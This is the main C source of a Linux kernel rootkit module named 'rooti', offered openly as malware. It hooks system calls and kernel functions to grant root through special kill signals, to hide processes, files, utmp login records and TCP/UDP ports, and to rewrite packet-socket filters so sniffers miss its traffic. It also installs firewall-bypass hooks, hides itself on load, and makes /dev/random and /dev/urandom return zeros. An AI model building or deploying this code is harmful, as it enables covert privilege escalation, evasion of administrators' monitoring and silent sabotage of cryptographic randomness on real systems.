#include <linux/init.h>
#include <linux/module.h>
#include <linux/kernel.h>
#include <linux/types.h>
#include <linux/string.h>
#include <linux/uaccess.h>
#include <linux/dirent.h>
#include <linux/threads.h>
#include <linux/file.h>
#include <linux/filter.h>
#include <net/sock.h>
#include <net/tcp.h>
#include "hooking/syscall.h"
#include "hooking/func.h"
#include "capabilities/privilege.h"
#include "capabilities/tracking.h"
#include "capabilities/unloading.h"
#include "capabilities/fw_bypass.h"
#include "capabilities/hiding/dentry.h"
#include "capabilities/hiding/module.h"
#include "capabilities/hiding/login.h"
#include "capabilities/hiding/net.h"
#include "capabilities/tracking/process.h"
#include "utils.h"
#include "config.h"

MODULE_LICENSE("GPL");
MODULE_AUTHOR("Omri Ben Zikri");
MODULE_DESCRIPTION("Very fun rootkit");
MODULE_VERSION("1.0.0");

// Unused signal numbers which can be used by the rootkit for its own purposes
enum rooti_signal {
    ROOTI_SIG_PROC_BIND = 61,   // request to bind to a proccess
    ROOTI_SIG_PROC_UNHIDE = 62, // request to unhide a process
    ROOTI_SIG_PROC_HIDE = 63,   // request to hide a process
    ROOTI_SIG_PE = 64           // request for privilege escalation
};

// List of tracked processes (for each one we track different attributes)
static LIST_HEAD(rooti_tracked_procs);

// List of /proc directory FDs opened by userspace processes
static LIST_HEAD(rooti_proc_tracked_fds);

// List of FDs of /var/run/utmp opened by userspace processes
static LIST_HEAD(rooti_utmp_tracked_fds);

struct list_head *rooti_tracked_fds_lists[] = {
    &rooti_proc_tracked_fds,
    &rooti_utmp_tracked_fds
};

// References to the original syscall handlers which we are hooking
static asmlinkage long (*orig_kill)(const struct pt_regs *regs);
static asmlinkage long (*orig_openat)(const struct pt_regs *regs);
static asmlinkage long (*orig_close)(const struct pt_regs *regs);
static asmlinkage long (*orig_pread64)(const struct pt_regs *regs);
static asmlinkage long (*orig_getdents64)(const struct pt_regs *regs);
static asmlinkage long (*orig_socket)(const struct pt_regs *regs);
static asmlinkage long (*orig_setsockopt)(const struct pt_regs *regs);

// References to other kernel functions which we are hooking
static int (*orig_tcp4_seq_show)(struct seq_file *seq, void *v);
static int (*orig_udp4_seq_show)(struct seq_file *seq, void *v);
static ssize_t (*orig_random_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);
static ssize_t (*orig_urandom_read_iter)(struct kiocb *kiocb, struct iov_iter *iter);


static asmlinkage long hook_kill(const struct pt_regs *regs)
{
    int sig = regs->si;

    if (sig == ROOTI_SIG_PE) {
        return rooti_elevate_privilege();
    }
    else if (sig == ROOTI_SIG_PROC_HIDE) {
        return rooti_track_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
    }
    else if (sig == ROOTI_SIG_PROC_UNHIDE) {
        rooti_untrack_proc_attr(current->pid, ROOTI_PROC_HIDDEN, &rooti_tracked_procs);
        return 0;
    }
    return orig_kill(regs);
}

static asmlinkage long hook_openat(const struct pt_regs *regs)
{
    // Allocate a kernel buffer to store the requested filename + null terminator
    char *filepath_user = (char *)regs->si;
    char *filepath_kernel = kmalloc(PATH_MAX, GFP_KERNEL);
    if (filepath_kernel == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return orig_openat(regs);
    }

    // Copy the requested filename to the kernel mode buffer
    int len = strncpy_from_user(filepath_kernel, filepath_user, PATH_MAX - 1);
    if (len < 0) {
        ROOTI_DEBUG("strncpy_from_user() failed: %d", len);
        kfree(filepath_kernel);
        return orig_openat(regs);
    }
    filepath_kernel[PATH_MAX - 1] = '\0';

    // Invoke the original syscall
    int fd = orig_openat(regs);
    int err;
    
    // Check if the requested file to open is the /proc VFS directory
    if (strncmp(filepath_kernel, "/proc", PATH_MAX) == 0) {
        err = rooti_track_fd(fd, &rooti_proc_tracked_fds);
    }
    // Check if the requested file to open is the utmp file storing login records
    else if (strncmp(filepath_kernel, "/var/run/utmp", PATH_MAX) == 0) {
        err = rooti_track_fd(fd, &rooti_utmp_tracked_fds);
    }

    kfree(filepath_kernel);
    return fd;
}

static asmlinkage long hook_close(const struct pt_regs *regs)
{
    int fd = regs->di;
    struct rooti_tracked_fd *record;

    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        // Search for a tracking of this FD and if found, remove it
        record = rooti_search_tracked_fd(fd, rooti_tracked_fds_lists[i]);
        if (record != NULL) {
            rooti_untrack_fd(record);
        }
    }
    return orig_close(regs);
}

static asmlinkage long hook_pread64(const struct pt_regs *regs) {
    int fd = regs->di;
    char *user_buf = (char *)regs->si;
    size_t count = regs->dx;
    
    // Invoke the original syscall
    size_t nread = orig_pread64(regs);

    // Is this a read of /var/utmp?
    if (rooti_is_tracked_fd(fd, &rooti_utmp_tracked_fds)) {
        rooti_hide_login_entry(user_buf, count);
    }
    return nread;
}

static asmlinkage long hook_getdents64(const struct pt_regs *regs)
{
    // Invoke the original syscall
    int fd  = regs->di;
    struct linux_dirent64 *user_buf = (struct linux_dirent64 *)regs->si;
    int nread = orig_getdents64(regs);
    if (nread < 0) {
        return nread;
    }

    // Check if the directory FD is of /proc
    bool is_proc_dir = rooti_is_tracked_fd(fd, &rooti_proc_tracked_fds);

    // Filter any files we wish to hide from the buffer
    return rooti_hide_dir_entries(user_buf, nread, is_proc_dir, &rooti_tracked_procs);
}

static asmlinkage long hook_socket(const struct pt_regs *regs)
{
    struct socket *sock;
    int family = regs->di;
    int fd = orig_socket(regs);
    
    if (fd == -1 || family != AF_PACKET) {
        return fd;
    }

    sock = sock_from_file(fget(fd));
    if (sock == NULL) {
        ROOTI_DEBUG("sock_from_file() failed");
        return fd;
    }
    rooti_overwrite_traffic_filter(sock->sk);

    return fd;
}

static asmlinkage long hook_setsockopt(const struct pt_regs *regs)
{
    int fd = regs->di;
    int optname = regs->dx;
    int optlen = regs->r8;
    sockptr_t optval = USER_SOCKPTR((char __user *)regs->r10);

    struct socket *sock;
    struct sock_fprog user_fprog;

    int err = orig_setsockopt(regs);
    if (err) {
        return err;
    }

    sock = sock_from_file(fget(fd));
    if (sock == NULL) {
        ROOTI_DEBUG("sock_from_file() failed");
        return 0;
    }

    switch (optname) {
    case SO_ATTACH_FILTER:
        err = copy_bpf_fprog_from_user(&user_fprog, optval, optlen);
        if (err) {
            ROOTI_DEBUG("copy_bpf_fprog_from_user() failed: %d", err);
            return 0;
        }
        
        rooti_inject_traffic_filter(sock->sk, &user_fprog);
        break;
        
    case SO_DETACH_FILTER:
        rooti_overwrite_traffic_filter(sock->sk);
        break;

    default:
        break;
    }

    return 0;
}

static int hook_tcp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    // Check that this is not the header line and that the record is the one we want to hide
    if (socket != SEQ_START_TOKEN && rooti_should_hide_tcp_port(socket->sk_num)) {
        return 0;
    }
    // Not the port to hide - call the original handler
    return orig_tcp4_seq_show(seq, v);
}

static int hook_udp4_seq_show(struct seq_file *seq, void *v)
{
    struct sock *socket = v;

    // Check that this is not the header line and that the record is the one we want to hide
    if (socket != SEQ_START_TOKEN && rooti_should_hide_udp_port(socket->sk_num)) {
        return 0;
    }

    // Not the port to hide - call the original handler
    return orig_udp4_seq_show(seq, v);
}

static ssize_t hook_random_read_iter(struct kiocb *kiocb, struct iov_iter *iter)
{
    // Get the size of the user buffer and allocate a matching kernel buffer filled with zeros
    size_t len = iov_iter_count(iter);
    char *kernel_buf = kzalloc(len, GFP_KERNEL);
    if (kernel_buf == NULL) {
        ROOTI_DEBUG("failed to allocate memory");
        return -ENOMEM;
    }

    // Copy the rigged buffer back into userspace
    int err = copy_to_iter(kernel_buf, len, iter);
    if (!err) {
        ROOTI_DEBUG("copy_to_iter() failed: %d", err);
        kfree(kernel_buf);
        return -EFAULT;
    }

    kfree(kernel_buf);
    return len;
}

/* I am not going for full coverage of every possible system call that should be tampered with
 * in order to achieve our goals (because that would take eternity). Instead, this rootkit only
 * messes with system calls that are used by the common Linux utils (ls, ps, ss, who...) */
struct rooti_func_hook func_hooks[] = {
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_kill"), hook_kill, &orig_kill),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_openat"), hook_openat, &orig_openat),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_close"), hook_close, &orig_close),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_pread64"), hook_pread64, &orig_pread64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_getdents64"), hook_getdents64, &orig_getdents64),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_socket"), hook_socket, &orig_socket),
    ROOTI_FUNC_HOOK(ROOTI_SYSCALL_NAME("sys_setsockopt"), hook_setsockopt, &orig_setsockopt),
    ROOTI_FUNC_HOOK("tcp4_seq_show", hook_tcp4_seq_show, &orig_tcp4_seq_show),
    ROOTI_FUNC_HOOK("udp4_seq_show", hook_udp4_seq_show, &orig_udp4_seq_show),
    ROOTI_FUNC_HOOK("random_read_iter", hook_random_read_iter, &orig_random_read_iter),
    ROOTI_FUNC_HOOK("urandom_read_iter", hook_random_read_iter, &orig_urandom_read_iter)
};

// LKM initialization
static int __init rooti_init(void)
{
    ROOTI_DEBUG("init");

    // Resolves the address of kallsyms_lookup_name for later use
    int ret = rooti_resolve_kln_addr();
    if (ret < 0) {
        ROOTI_DEBUG("rooti_resolve_kln_addr() failed: %d", ret);
        return ret;
    }

    // Install function hooks :D
    ret = rooti_install_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));
    if (ret < 0) {
        ROOTI_DEBUG("rooti_install_hooks() failed: %d", ret);
        return ret;
    }

    // Install firewall bypass hooks
    rooti_install_fw_bypass_hooks();

    // If configured to be hidden by default, hide this rootkit
#ifndef ROOTI_DEBUG_SHOWME
    ret = rooti_hideme();
    if (ret < 0)
        return ret;
#endif

    return 0;
}

// LKM cleanup
static void __exit rooti_exit(void)
{
    ROOTI_DEBUG("exit");

    rooti_uninstall_func_hooks(func_hooks, ARRAY_SIZE(func_hooks));

    // Uninstall firewall bypassing hooks
    rooti_uninstall_fw_bypass_hooks();
    
    struct rooti_tracked_fd *record;
    struct rooti_tracked_fd *tmp;

    // Release any remaining records
    for (int i = 0; i < ARRAY_SIZE(rooti_tracked_fds_lists); i++) {
        list_for_each_entry_safe(record, tmp, rooti_tracked_fds_lists[i], head) {
            rooti_untrack_fd(record);
        }
    }
}

module_init(rooti_init);
module_exit(rooti_exit);
